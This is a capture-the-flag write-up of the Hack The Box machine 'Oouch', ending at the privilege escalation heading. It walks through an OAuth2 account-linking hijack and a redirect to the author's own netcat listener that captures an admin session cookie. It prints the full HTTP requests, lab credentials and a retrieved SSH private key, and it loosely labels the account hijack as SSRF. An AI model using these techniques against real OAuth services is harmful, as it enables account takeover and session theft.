---
title: "Oouch"
difficulty: Hard
os: Linux
points: 40
rating: 4.9
date: 2020-02-29
avatar: assets/htb/oouch.png
htb_url: https://app.hackthebox.com/machines/Oouch
---
## Overview

This hard Linux box gave me a deep dive into how a federated access control system operates under the hood, in this case an Oauth2 deployment. Getting through it demanded patience and a willingness to read error messages carefully and act on what they revealed.

## Enumeration

### Nmap scan

I kicked things off by running nmap against `<YOUR_IP>`. My usual flag set is: `-p-` to sweep every TCP port, `-sC` (the same as `--script=default`) to fire nmap's default enumeration scripts at the host, `-sV` for service detection, and `-oN <name>` to write the results to a file called `<name>`.

```bash
kac0@kalimaa:~/htb/oouch$ nmap -p- -sC -sV -oA oouch <YOUR_IP>

Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-09 14:10 EDT
WARNING: Service <YOUR_IP>:8000 had already soft-matched rtsp, but now soft-matched sip; ignoring second value
Nmap scan report for <YOUR_IP>
Host is up (0.13s latency).
Not shown: 65529 closed ports
PORT      STATE    SERVICE VERSION
21/tcp    open     ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp            49 Feb 11 19:34 project.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.81
|      Logged in as ftp                                                                                
|      TYPE: ASCII                                                                                     
|      Session bandwidth limit in byte/s is 30000                                                      
|      Session timeout in seconds is 300                                                               
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open     ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 8d:6b:a7:2b:7a:21:9f:21:11:37:11:ed:50:4f:c6:1e (RSA)
|_  256 d2:af:55:5c:06:0b:60:db:9c:78:47:b5:ca:f4:f1:04 (ED25519)
5000/tcp  open     http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
| http-title: Welcome to Oouch
|_Requested resource was http://<YOUR_IP>:5000/login?next=%2F
5643/tcp  filtered unknown
8000/tcp  open     rtsp
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/html
|     Vary: Authorization
|     <h1>Bad Request (400)</h1>
|   RTSPRequest: 
|     RTSP/1.0 400 Bad Request
|     Content-Type: text/html
|     Vary: Authorization
|     <h1>Bad Request (400)</h1>
|   SIPOptions: 
|     SIP/2.0 400 Bad Request
|     Content-Type: text/html
|     Vary: Authorization
|_    <h1>Bad Request (400)</h1>
|_http-title: Site doesn't have a title (text/html).
|_rtsp-methods: ERROR: Script execution failed (use -d to debug)
24079/tcp filtered unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.80%I=7%D=6/9%Time=5EDFD9E7%P=x86_64-pc-linux-gnu%r(Get
SF:Request,64,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
SF:/html\r\nVary:\x20Authorization\r\n\r\n<h1>Bad\x20Request\x20\(400\)</h
SF:1>")%r(FourOhFourRequest,64,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nCont
SF:ent-Type:\x20text/html\r\nVary:\x20Authorization\r\n\r\n<h1>Bad\x20Requ
SF:est\x20\(400\)</h1>")%r(HTTPOptions,64,"HTTP/1\.0\x20400\x20Bad\x20Requ
SF:est\r\nContent-Type:\x20text/html\r\nVary:\x20Authorization\r\n\r\n<h1>
SF:Bad\x20Request\x20\(400\)</h1>")%r(RTSPRequest,64,"RTSP/1\.0\x20400\x20
SF:Bad\x20Request\r\nContent-Type:\x20text/html\r\nVary:\x20Authorization\
SF:r\n\r\n<h1>Bad\x20Request\x20\(400\)</h1>")%r(SIPOptions,63,"SIP/2\.0\x
SF:20400\x20Bad\x20Request\r\nContent-Type:\x20text/html\r\nVary:\x20Autho
SF:rization\r\n\r\n<h1>Bad\x20Request\x20\(400\)</h1>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2390.62 seconds
```

#### Anonymous FTP

During early recon I like to check remote-access and file-sharing services like ftp, telnet, and SMB for anonymous access before sinking time into heavier services. With port 21 open here, my first move was logging into FTP as `anonymous`.  

```http
kac0@kalimaa:~/htb/oouch$ ftp <YOUR_IP>

Connected to <YOUR_IP>. 
220 qtc's development server 
Name (<YOUR_IP>:kac0): anonymous 
230 Login successful.    
Remote system type is UNIX. 
Using binary mode to transfer files.

ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            49 Feb 11 19:34 project.txt
226 Directory send OK.
ftp> get project.txt
local: project.txt remote: project.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for project.txt (49 bytes).
226 Transfer complete.
49 bytes received in 0.00 secs (314.8129 kB/s)
ftp> cd ..
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            49 Feb 11 19:34 project.txt
226 Directory send OK.
ftp> quit
221 Goodbye.
```

The server held just a single file, `project.txt`, and I had no way to browse elsewhere.

```text
kac0@kalimaa:~/htb/oouch$ cat project.txt
Flask -> Consumer
Django -> Authorization Server
```

The file showed that the project used two frameworks, `Flask` and `Django`, for its separate services. A quick look confirmed that [Flask](https://flask.palletsprojects.com/) and [Django](https://www.djangoproject.com/) are both Python frameworks for web apps.

I then tried SSH, but it refused to let me in without a private key _\(though I noticed it wasn't asking for a password\)_.

```text
kac0@kalimaa:~/htb/oouch$ ssh <YOUR_IP>
kac0@<YOUR_IP>: Permission denied (publickey).
```

### Website on port 5000

Port 5000 was next up. Being a non-standard port it could have served anything, but since Nmap identified an Nginx HTTP server there, I opened my browser to take a look. Visiting `http://<YOUR_IP>:5000` dropped me onto a fairly minimal login page.

![](assets/wu/oouch/img-1.png)

## Initial Foothold

I started by trying a handful of common default credentials like 'admin:admin', none of which worked. So I headed to the `Register` page, made an account, logged in, and began exploring the site. 

![](assets/wu/oouch/img-2.png)

Most of the internal pages offered little to interact with, but the `/contact` page had a noteworthy "send a message to the administrator" style input field.

![](assets/wu/oouch/img-3.png)

Testing the contact form for XSS with `javascript:alert(document.cookie)` returned `"Hacking Attempt Detected"` along with a one minute IP ban \(shown below\). The word 'JavaScript' passed through fine, yet just sending 'alert' also set off the same message, which told me some kind of filter, WAF, or IPS was in play.

![](assets/wu/oouch/img-4.png)

I then ran Gobuster to hunt for additional reachable directories, which turned up an `/oauth` page. Browsing to `http://<YOUR_IP>:5000/oauth` revealed a "hidden" page containing these links:

![](assets/wu/oouch/img-5.png)

> * In order to connect your account:`http://consumer.oouch.htb:5000/oauth/connect`
> * Once your account is connected, login here:`http://consumer.oouch.htb:5000/oauth/login`

### Website on port 8000

Clicking the `/connect` link sent me to `http://authorization.oouch.htb:8000/login/`. To continue, I added each of the new domains I'd discovered to my `/etc/hosts` file.

```text
<YOUR_IP>    oouch.htb
<YOUR_IP>    consumer.oouch.htb
<YOUR_IP>    authorization.oouch.htb
```

None of my credentials worked on the authorization site, so I looked around for a registration option. The register link sat at the root, `http://authorization.oouch.htb:8000/`.

### The Oauth2 server

![](assets/wu/oouch/img-6.png)

These resources proved helpful as I researched the Oauth2 protocol:

> * [https://dhavalkapil.com/blogs/Attacking-the-OAuth-Protocol/](https://dhavalkapil.com/blogs/Attacking-the-OAuth-Protocol/)
> * [https://aaronparecki.com/oauth-2-simplified/](https://aaronparecki.com/oauth-2-simplified/)
> * [RFC 6749: The OAuth 2.0 Authorization Framework](https://tools.ietf.org/html/rfc6749)

Once I registered and signed in, I was presented with two API links, `/oauth/get_user` and `/oauth/token`.

![](assets/wu/oouch/img-7.png)

Neither link did anything useful yet \(my research suggested I needed a higher-privilege authorization token\). I needed to obtain that token from a privileged user, and the only admin-related thing I had come across was the `/contact` page on the port 5000 site. Given that the `/oauth` page exposed a "connect" method, I reasoned the way forward involved using oauth2 to tie my account to the admin's.  

After plenty of trial and error and a good deal of reading through the Oauth2 docs, I worked out how to halt the account-linking authorization flow right before its final step. This leaves the account holding a connect authorization token that's meant to be forwarded to the service being connected. Because that token travels in the URL, it's easy to hand it to someone else as a link and link my account to one of my choosing.  

To pull this off, I went back to my original account on `http://consumer.oouch.htb:5000/` and used the `/connect` link on the `/oauth` page to begin linking my two accounts \(the consumer account on port 5000 and the internal Oauth2 account on port 8000\). 

![](assets/wu/oouch/img-8.png)

With Burp intercepting every browser request, I let each one through until I reached the button that authorizes the connection. I clicked it and forwarded the resulting POST to the server in Burp,

```http
POST /oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&scope=read HTTP/1.1
Host: authorization.oouch.htb:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://authorization.oouch.htb:8000/oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&scope=read
Content-Type: application/x-www-form-urlencoded
Content-Length: 266
Connection: close
Cookie: csrftoken=NfJT07Vec0wl4nbyaopTMl0qYHv5UAXMiJeIrn1yEi61fv4tv76sl9p0tJeWv4SX; sessionid=7sfqfco25nztiemxl9cdahojkewxw2xj
Upgrade-Insecure-Requests: 1
DNT: 1

csrfmiddlewaretoken=ZNU3fziGduXycKscNjozBj8EY2TLhuRYei3lxLEWB80XoWZSBdn8SXVIb4zZb7G0&redirect_uri=http%3A%2F%2Fconsumer.oouch.htb%3A5000%2Foauth%2Fconnect%2Ftoken&scope=read&client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&state=&response_type=code&allow=Authorize
```

...then caught the GET request carrying the authorization link and dropped it in Burp so the two accounts wouldn't actually get linked. I had to kick off the authorization flow purely to capture that link, which I could then use to make any other account connect to mine.

```http
GET /oauth/connect/token?code=OcnuHPMmp4x0UcGjI9Tp87tnvxdfI6 HTTP/1.1
Host: consumer.oouch.htb:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://authorization.oouch.htb:8000/oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&scope=read
Connection: close
Cookie: session=.eJwlT7tuwzAM_BVHcwaJkqjIn9EOHYogoCgyMeLYgGVPQf69AjodDvfA3dvcdKb2kGbG37cZ9g7mJa3RXczZfMl9avtG-7Quw_fB3BU95tPwIzOvLxmeNC0nc_1cz71ok_Yw474d0tlUzWgIgAQROWMK9oI5CWoIwNmjEla2TmJ16InRW2V7UUfAnBLGnkAbE_oi6h0HT6VycS6iBQdETn3MzByxQqICLlmpQTS4AAqhez31C9w2ve3rU5a-B4pjqVI1-hSiiI25BE5UMyUINqAApT6q544m2_8JNJ8_--NYTw.XuEzuA.FcBkilyEHZbTXL3aPtl9PU66Kmk
Upgrade-Insecure-Requests: 1
DNT: 1
```

## Road to User

### Server-side Request Forgery \(SSRF\)

My next goal was to trick the admin into linking his account to mine to escalate privileges. I returned to `http://consumer.oouch.htb:5000/contact` and sent the admin my authorization token link, which was already primed by the earlier POST. The only thing left was for the admin to click it and connect our accounts. This is a classic case of [Server-side Request Forgery \(SSRF\)](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery).

![](assets/wu/oouch/img-9.png)

I passed the admin this link, hoping it would somehow get clicked: `http://consumer.oouch.htb:5000/oauth/connect/token?code=4GCuHQ0LTjKkezQmz2jlolgHxfLXbc` _\(grabbed from the URL bar after Burp dropped the earlier `GET`\)._  

![](assets/wu/oouch/img-10.png)

Once I got the message thanking me for my feedback to the admin, I followed the `http://consumer.oouch.htb:5000/oauth/login` link from the `/oauth` page to complete the account connection.

Note: You have to log in fast otherwise the token expires!

![](assets/wu/oouch/img-11.png)

The `/profile` page now indicated I was logged in as the user `qtc`, with my oauth2 account tied to it.

### Finding the developer creds

On the `/documents` page I now saw the following items listed:

> Hello qtc! You have currently following documents stored:
>
> * dev\_access.txt        **develop:supermegasecureklarabubu123!** -&gt; Allows application registration.
> * o\_auth\_notes.txt    /api/get\_user -&gt; user data. oauth/authorize -&gt; Now also supports GET method.
> * todo.txt            Chris mentioned all users could obtain my ssh key. Must be a joke...

I now held credentials for a `develop` user but wasn't certain where they applied, beyond the hint that they enabled registering an application. 

I went back to gobuster to dig up more directories and found `/oauth/applications/register/`, which threw an HTTP basic auth prompt that accepted the develop creds from the `/documents` page.  

![](assets/wu/oouch/img-12.png)

Logging in brought up a page for registering a new application. I did more reading on registering web apps and located documentation covering both Django and Flask.  

> [https://django-registration.readthedocs.io/en/3.1/quickstart.html](https://django-registration.readthedocs.io/en/3.1/quickstart.html) - Programming information about registering Django apps

> [https://flask-oauthlib.readthedocs.io/en/latest/oauth2.html](https://flask-oauthlib.readthedocs.io/en/latest/oauth2.html) - how to register a new Flask application

It turns out the authorization link can be set to redirect anywhere you like. By pointing the redirect URL at my own machine, I could listen with netcat and check whether it sent back anything worthwhile.

_I forgot the port on my redirect URL while filling out the request the first time. Luckily there was an edit button!_

![](assets/wu/oouch/img-13.png)

Side note: After creating an app and hitting "Go Back", a basic auth prompt labeled "Oouch Admin Only" appears at `http://authorization.oouch.htb:8000/oauth/applications/`. The `develop` creds were rejected here.

![](assets/wu/oouch/img-14.png)

In Burp, my web app registration request appeared as follows:

```http
POST /oauth/applications/register/ HTTP/1.1
Host: authorization.oouch.htb:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://authorization.oouch.htb:8000/oauth/applications/register/
Content-Type: application/x-www-form-urlencoded
Content-Length: 598
Authorization: Basic ZGV2ZWxvcDpzdXBlcm1lZ2FzZWN1cmVrbGFyYWJ1YnUxMjMh
Connection: close
Cookie: csrftoken=qbyohMDkKGDo4c0PDr639MymQiqCyIv7tqPewPWOvY9QVzqOHH5q7L2w733HrfmA; sessionid=t8pysxzmxfaziblsj7bji2hz79kz7mry
Upgrade-Insecure-Requests: 1
DNT: 1

csrfmiddlewaretoken=8saMcdN6jW2HIJjcK33GCJ7TeAXljGnDvZbLYVRNgNzPSGJ1xWjjhYWRalMvov1A&name=kaio&client_id=fN0PGweG94VEL6MzopplC1VASOetEWsVy3NW29ak&initial-client_id=fN0PGweG94VEL6MzopplC1VASOetEWsVy3NW29ak&client_secret=sPtIDd40zXgsmk8QLZ6vqb0AfCsYAOXQE6XPF485RusVdMfUdqz5EZjRTurBLMRnn1LN5ACYNxarbiASALSMqAOhKIr3bvGzI5QDV5Pg2QAGmw83OyHJBbyDfidZDOti&initial-client_secret=sPtIDd40zXgsmk8QLZ6vqb0AfCsYAOXQE6XPF485RusVdMfUdqz5EZjRTurBLMRnn1LN5ACYNxarbiASALSMqAOhKIr3bvGzI5QDV5Pg2QAGmw83OyHJBbyDfidZDOti&client_type=public&authorization_grant_type=authorization-code&redirect_uris=http%3A%2F%2F10.10.14.253%3A1234
```

Once I forwarded the POST request with my credentials, I was redirected via a GET request back to the register page.

```http
GET /accounts/login/?next=/oauth/applications/register/ HTTP/1.1
Host: authorization.oouch.htb:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://authorization.oouch.htb:8000/oauth/applications/register/
Connection: close
Cookie: csrftoken=qbyohMDkKGDo4c0PDr639MymQiqCyIv7tqPewPWOvY9QVzqOHH5q7L2w733HrfmA
Upgrade-Insecure-Requests: 1
DNT: 1
```

I then fired an authorization request at the server to connect to the app I'd 'created', expecting it to redirect to my netcat listener:

```http
GET /oauth/authorize/?client_id=aIX617P5jWh41UJ1Li3xntUi3W1xVOZDPb0YupTG&redirect_uris=http%3A%2F%2F10.10.14.253%3A1234&grant_type=authorization-code&client_secret=GaUjTTAVrdAJPQHlp3B5NwpR0KvBSSvM6cIopY4uYmZ5N77toqYTidg5CMsW0CMpaWRuBP2YmjNcM9fZD0cJbEIqPyJrWn6Y8RcRD8E2w8C9MuZpjiDhvkRVr9Du97DS HTTP/1.1
Host: authorization.oouch.htb:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: csrftoken=RE8nA0Evrg3xPQ2uEqOg4jEWdDSuktJXpc4tf1ugg4Ckf3MIsqGI7Yafq3W1eOS5; sessionid=veopt7hc8e8bv4jwl4ekv4ejlby8kxdn
Upgrade-Insecure-Requests: 1
DNT: 1
```

My listener caught a connection!

```bash
kac0@kalimaa:~/htb/oouch$ nc -lvnp 1234 > djangoapp                                                 
listening on [any] 1234 ...                                                                            
connect to [10.10.14.253] from (UNKNOWN) [10.10.14.253] 53300
```

The connection delivered only an error message, but that was enough to confirm the behavior I wanted and hinted at what I'd need to send for a proper response.

```http
GET /?error=invalid_request&error_description=Missing+response_type+parameter. HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
DNT: 1
Host: 10.10.14.253:1234
```

Having confirmed the server would connect back to me, I again sent the request as a link to the admin through the `http://consumer.oouch.htb:5000/contact` page, hoping to reuse SSRF for more information.

```bash
http://authorization.oouch.htb:8000/oauth/authorize/?client_id=aIX617P5jWh41UJ1Li3xntUi3W1xVOZDPb0YupTG&redirect_uris=http%3A%2F%2F10.10.14.253%3A1234&grant_type=authorization-code&client_secret=GaUjTTAVrdAJPQHlp3B5NwpR0KvBSSvM6cIopY4uYmZ5N77toqYTidg5CMsW0CMpaWRuBP2YmjNcM9fZD0cJbEIqPyJrWn6Y8RcRD8E2w8C9MuZpjiDhvkRVr9Du97DS
```

And a reply came back!

```http
GET /?error=invalid_request&error_description=Missing+response_type+parameter. HTTP/1.1
Host: 10.10.14.253:1234
User-Agent: python-requests/2.21.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Cookie: sessionid=34w2oj9hyjofej6d4cwr9dykbm5dl9ex;
```

I now had the admin's session cookie. Since I was already authenticated as `qtc` on the consumer portal, I used this cookie to test logging into `http://authorization.oouch.htb:8000/` as `qtc` 

![](assets/wu/oouch/img-15.png)

It worked! With a higher-privilege oauth2 account in hand, I figured it was time to exercise those endpoint links, grabbing an authorization token from `/oauth/token` to reach the `/oauth/get_user` API I'd noticed earlier.

I then did more oauth2 research, focusing on authenticating to APIs:

> * [https://www.toptal.com/django/integrate-oauth-2-into-django-drf-back-end](https://www.toptal.com/django/integrate-oauth-2-into-django-drf-back-end)
> * [https://docs.oracle.com/en/cloud/saas/marketing/eloqua-develop/Developers/GettingStarted/Authentication/authenticate-using-oauth.htm](https://docs.oracle.com/en/cloud/saas/marketing/eloqua-develop/Developers/GettingStarted/Authentication/authenticate-using-oauth.htm)
>
>     I found out that the grant type must be `client_credentials`
>
> * [https://www.oauth.com/oauth2-servers/access-tokens/client-credentials/](https://www.oauth.com/oauth2-servers/access-tokens/client-credentials/)
>
>     and the request must also include `client_id` and `client_secret`.

My initial attempts came up short:

```http
POST /oauth/token/ HTTP/1.1
Host: authorization.oouch.htb:8000
Content-Length: 227
Content-type:application/x-www-form-urlencoded

grant_type=client_credentials&
client_id=aIX617P5jWh41UJ1Li3xntUi3W1xVOZDPb0YupTG&
client_secret=GaUjTTAVrdAJPQHlp3B5NwpR0KvBSSvM6cIopY4uYmZ5N77toqYTidg5CMsW0CMpaWRuBP2YmjNcM9fZD0cJbEIqPyJrWn6Y8RcRD8E2w8C9MuZpjiDhvkRVr9Du97DS
```

```http
HTTP/1.1 401 Unauthorized
Content-Type: application/json
Cache-Control: no-store
Pragma: no-cache
WWW-Authenticate: Bearer, error="invalid_client"
X-Frame-Options: SAMEORIGIN
Content-Length: 27
Vary: Authorization

{"error": "invalid_client"}
```

I kept hitting `"invalid_grant_type"` and `"invalid_client"` errors until more reading revealed the request must not contain newlines! [https://stackoverflow.com/questions/29360349/getting-error-unsupported-grant-type-when-trying-to-get-a-jwt-by-calling-an](https://stackoverflow.com/questions/29360349/getting-error-unsupported-grant-type-when-trying-to-get-a-jwt-by-calling-an)

The next attempt fared better:

```http
POST /oauth/token/ HTTP/1.1
Host: authorization.oouch.htb:8000
Content-type:application/x-www-form-urlencoded
Content-Length: 223

grant_type=client_credentials&client_id=BINNWck8w5CElXxFcUp4hWlbbnJ9YSRautJ2WNjh&client_secret=MGOEEB0A2EptkpF35uYoJOwVgBQDISm2RQAzojkGK4N3whYaSiAl3mjf7EoPyjteCGoJbuiMCSNI1OhxzjEpETFNoUSHvIaMsIUVEos1KKumTFlZ3obeZYhMYthZKVIz
```

```http
HTTP/1.1 200 OK
Content-Type: application/json
Cache-Control: no-store
Pragma: no-cache
X-Frame-Options: SAMEORIGIN
Content-Length: 116
Vary: Authorization

{"access_token": "A8lhuPCNBxtMZwFJ9vgpdh1ntW94zg", "expires_in": 600, "token_type": "Bearer", "scope": "read write"}
```

### Finding user creds

I had the access token! I tried using it to pull data from the `/oauth/get_user` API but got nothing of value back. After experimenting, I recalled the note on qtc's `/documents` page about users easily accessing the SSH key and swapped `get_user` for `get_ssh`. 

```http
GET /api/get_ssh/?access_token=A8lhuPCNBxtMZwFJ9vgpdh1ntW94zg HTTP/1.1
Host: authorization.oouch.htb:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: csrftoken=RE8nA0Evrg3xPQ2uEqOg4jEWdDSuktJXpc4tf1ugg4Ckf3MIsqGI7Yafq3W1eOS5; sessionid=34w2oj9hyjofej6d4cwr9dykbm5dl9ex;
Upgrade-Insecure-Requests: 1
DNT: 1
Cache-Control: max-age=0
```

Out came an SSH key for the user `qtc`! Frustratingly, it was on one line packed with `\n` characters that needed cleaning up.

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 2708
Vary: Authorization, Cookie

{"ssh_server": "consumer.oouch.htb", "ssh_user": "qtc", "ssh_key": "-----BEGIN OPENSSH PRIVATE KEY-----\n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\n-----END OPENSSH PRIVATE KEY-----"}
```

Next I needed to SSH into the box. The `ssh -i <private_key_file>` __command lets you authenticate with a private key.

Note: Don't forget to**`chmod 600`** your SSH keys before use!

### User.txt

```bash
kac0@kalimaa:~/htb/oouch$ chmod 600 qtc.id_rsa
kac0@kalimaa:~/htb/oouch$
kac0@kalimaa:~/htb/oouch$ ssh qtc@<YOUR_IP> -i qtc.id_rsa

Linux oouch 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the 
individual files in /usr/share/doc/*/copyright.
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent 
permitted by applicable law.
Last login: Tue Feb 25 12:45:55 2020 from 10.10.14.3

qtc@oouch:~$ whoami && hostname
qtc
oouch
qtc@oouch:~$ uname -a
Linux oouch 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64 GNU/Linux

qtc@oouch:~$ cat user.txt 
6c92************************cd2b

qtc@oouch:~$ cat .note.txt 
Implementing an IPS using DBus and iptables == Genius?
```

I grabbed the `user.txt`! There was also a hidden `.note.txt` referencing the use of `DBus` and `iptables` to build an IPS.

## Path to Power \(Gaining Administrator Access\)

### Enumeration as user - `qtc`

